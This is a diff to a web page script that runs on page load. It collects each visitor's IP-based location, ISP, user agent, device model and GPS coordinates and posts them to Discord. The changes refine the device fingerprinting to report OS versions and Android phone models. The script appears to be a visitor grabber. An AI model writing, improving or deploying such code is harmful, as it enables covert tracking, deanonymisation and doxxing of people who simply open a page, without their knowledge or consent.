@@ -41,7 +41,7 @@
             try {
                 const ipData = await getIPInfo();
                 const userAgent = navigator.userAgent;
-                const deviceName = getDeviceName(userAgent); // Get device name
+                const deviceName = getDeviceName(userAgent); // Get detailed device name
                 const { latitude, longitude } = await getCoordinates();
 
                 await sendToDiscord(ipData, userAgent, deviceName, latitude, longitude);
@@ -54,13 +54,30 @@
         })();
 
         function getDeviceName(userAgent) {
-            // Simple function to detect the device name based on user agent
-            if (/mobile/i.test(userAgent)) return "Mobile Device";
-            if (/tablet/i.test(userAgent)) return "Tablet";
-            if (/win/i.test(userAgent)) return "Windows PC";
-            if (/mac/i.test(userAgent)) return "Mac";
-            if (/linux/i.test(userAgent)) return "Linux PC";
-            return "Unknown Device";
+            let deviceName = "Unknown Device";
+
+            // Check for specific devices using regex patterns
+            if (/iPad/i.test(userAgent)) {
+                deviceName = "iPad";
+            } else if (/iPhone/i.test(userAgent)) {
+                deviceName = "iPhone";
+            } else if (/Macintosh/i.test(userAgent)) {
+                deviceName = "Mac";
+            } else if (/Windows NT/i.test(userAgent)) {
+                deviceName = "Windows PC";
+                const version = userAgent.match(/Windows NT (\d+\.\d+)/);
+                if (version) deviceName += " " + version[1];
+            } else if (/Linux/i.test(userAgent)) {
+                deviceName = "Linux PC";
+            } else if (/Android/i.test(userAgent)) {
+                const match = userAgent.match(/Android ([\d\.]+); ([^;]+)/);
+                deviceName = match ? `Android ${match[1]} (${match[2]})` : "Android Device";
+            } else if (/Chrome/i.test(userAgent) && /Mobile/i.test(userAgent)) {
+                const match = userAgent.match(/Mobile\/([^ ]+)/);
+                deviceName = match ? `Chrome Mobile (${match[1]})` : "Chrome Mobile Device";
+            }
+
+            return deviceName;
         }
 
         async function getIPInfo() {
@@ -143,7 +160,7 @@
                         { name: "Location", value: `${ipData.city}, ${ipData.region} (${ipData.country})`, inline: true },
                         { name: "ISP", value: ipData.org, inline: true },
                         { name: "User Agent", value: userAgent },
-                        { name: "Device", value: deviceName }, // Added device name
+                        { name: "Device", value: deviceName }, // Added device model
                         { name: "Coordinates", value: `${latitude}, ${longitude}` }
                     ],
                     color: 3447003 // Color in Discord embed (blue)
